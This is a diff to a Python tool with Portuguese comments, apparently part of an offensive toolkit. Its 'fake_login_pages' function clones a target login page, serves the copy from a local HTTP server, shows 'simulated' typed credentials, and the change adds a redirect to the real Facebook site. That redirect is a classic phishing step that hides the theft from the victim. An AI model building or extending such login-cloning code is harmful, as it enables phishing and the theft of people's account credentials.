@@ -4,10 +4,10 @@ import requests
 import time
 import threading
 import http.server
-import socketserver
-import numlookupapi
+import webbrowser
 import numbers
-import nmap
+import numlookupapi
+import socketserver
 from colorama import init, Fore, Style
 
 # Porta para o servidor HTTP local
@@ -257,16 +257,23 @@ def fake_login_pages(language):
         response = requests.get(target_url)
         if response.status_code == 200:
             html_content = response.text
-            # Salvar HTML localmente
-            with open(os.path.join(HTML_CSS_DIR, 'fake_login_page.html'), 'w', encoding='utf-8') as f:
+            # Extrair o nome da página da URL
+            page_name = target_url.split('/')[-1]
+            # Salvar HTML localmente com o nome da página
+            with open(os.path.join(HTML_CSS_DIR, f'{page_name}.html'), 'w', encoding='utf-8') as f:
                 f.write(html_content)
             print("Página clonada com sucesso!")
 
             # Iniciar servidor HTTP local para servir a página clonada
             start_http_server()
 
-            # Exibir mensagem simulada de credenciais digitadas em um novo terminal
+            # Simular mensagem de credenciais digitadas em um novo terminal
             open_new_terminal(language)
+
+            # Redirecionar para a página oficial do Facebook após simulação
+            print("Redirecting to official Facebook page...")
+            time.sleep(3)  # Simulando redirecionamento
+            webbrowser.open("https://facebook.com")
 
             input("\nPressione Enter para continuar...")
         else:
